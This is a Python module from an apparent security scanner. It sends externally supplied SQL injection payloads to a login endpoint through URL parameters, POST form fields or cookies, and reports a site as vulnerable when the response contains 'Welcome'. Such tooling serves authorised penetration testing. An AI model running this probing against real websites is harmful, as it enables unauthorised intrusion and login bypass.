from modules.funcs.console import *
import requests

def f(url, payloads, method):
    try:
        if method == '1':
            # Method 1: Injecting into URL parameters
            for payload in payloads:
                payload = payload.strip()  # Remove leading/trailing whitespaces and newlines
                try:
                    response = requests.get(f"{url}?username={payload}&password=dummy")

                    # Check for indicators of successful SQL injection
                    if response.status_code == 200 and 'Welcome' in response.text:
                        print_success(f"URL: {url} - Payload: {payload} - SQL Injection (Method 1) - Vulnerable")
                    else:
                        print_warning(f"URL: {url} - Payload: {payload} - Not Vulnerable (Method 1)")

                except requests.exceptions.RequestException as e:
                    print_error(f"Error (requests): {e}")

        elif method == '2':
            # Method 2: Injecting into POST form data
            for payload in payloads:
                payload = payload.strip()  # Remove leading/trailing whitespaces and newlines
                try:
                    data = {'username': payload, 'password': 'dummy'}  # Adjust data fields as per the form
                    response = requests.post(url, data=data)

                    # Check for indicators of successful SQL injection
                    if response.status_code == 200 and 'Welcome' in response.text:
                        print_success(f"URL: {url} - Payload: {payload} - SQL Injection (Method 2) - Vulnerable")
                    else:
                        print_warning(f"URL: {url} - Payload: {payload} - Not Vulnerable (Method 2)")

                except requests.exceptions.RequestException as e:
                    print_error(f"Error (requests): {e}")

        elif method == '3':
            # Method 3: Injecting into cookies
            for payload in payloads:
                payload = payload.strip()  # Remove leading/trailing whitespaces and newlines
                try:
                    cookies = {'username': payload, 'password': 'dummy'}  # Adjust cookie names as per the website
                    response = requests.get(url, cookies=cookies)

                    # Check for indicators of successful SQL injection
                    if response.status_code == 200 and 'Welcome' in response.text:
                        print_success(f"URL: {url} - Payload: {payload} - SQL Injection (Method 3) - Vulnerable")
                    else:
                        print_warning(f"URL: {url} - Payload: {payload} - Not Vulnerable (Method 3)")

                except requests.exceptions.RequestException as e:
                    print_error(f"Error (requests): {e}")

        else:
            print_error("Invalid SQL injection method. Please enter either '1', '2', or '3'.")

    except Exception as e:
        print_error(f"Error: {e}")